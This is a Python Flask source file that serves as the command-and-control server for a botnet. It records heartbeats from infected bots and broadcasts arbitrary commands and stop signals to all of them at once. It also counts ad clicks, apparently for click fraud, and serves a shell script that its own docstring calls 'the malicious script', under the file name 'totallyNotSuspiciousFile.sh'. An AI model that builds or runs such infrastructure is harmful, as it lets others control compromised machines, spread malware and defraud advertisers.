import time
from typing import Dict, List
from flask import Flask, request, send_file, render_template, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS, cross_origin
import jsonpickle

from botnet_activity import BotnetActivity

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'
sio = SocketIO(app)
nb_clicks = 0
botnets = []


@sio.on('connect')
def connect():
    print("Socket connected")


@sio.event
def disconnect():
    print("Socket disconnected")


@sio.event
def heartbeat(data):
    """
    Get botnets heartbeats and save it
    """

    global botnets

    botnet: BotnetActivity = None
    for b in botnets:
        if b.uuid == data['uuid']:
            botnet = b

    if botnet is not None:
        botnet.heartbeat(data['running'])
    else:
        botnets.append(BotnetActivity(data['uuid'], data['running']))


@app.route('/', methods=["GET"])
def send_dashboard():
    """
    Render the dashboard page to control botnets
    """

    return send_from_directory('static', 'dashboard.html')


@app.route('/command', methods=["POST"])
def send_command():
    """
    Receive a JSON command definition and broadcast it to the connected botnets
    """

    emit("command", request.get_json(), namespace="/", broadcast=True)
    return "Done"


@app.route('/command/stop', methods=["POST"])
def send_stop():
    """
    Stop running command on every botnets
    """

    emit("stop", request.get_json(), namespace="/", broadcast=True)
    return "Done"


@app.route('/ad', methods=["GET"])
def click_ad():
    """
    Count clicked link
    """

    global nb_clicks
    nb_clicks += 1
    print("Clicks : ", nb_clicks)
    return str(nb_clicks)


@app.route('/botnets', methods=["GET"])
@cross_origin()
def get_botnets():
    """
    Return botnet list
    """

    global botnets
    botnets = list(filter(lambda b: (time.time_ns() //
                   1_000_000) - b.last_seen < 60_000, botnets))
    return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))


@app.route('/download', methods=["GET"])
def myscript():
    """
    Download the malicious script
    """

    path = "Shell_script/totallyNotSuspiciousFile.sh"
    return send_file(path)


@app.route('/home')
def home():
    """
    Render the download page
    """

    return render_template("page_web.html")


if __name__ == '__main__':
    sio.run(app)
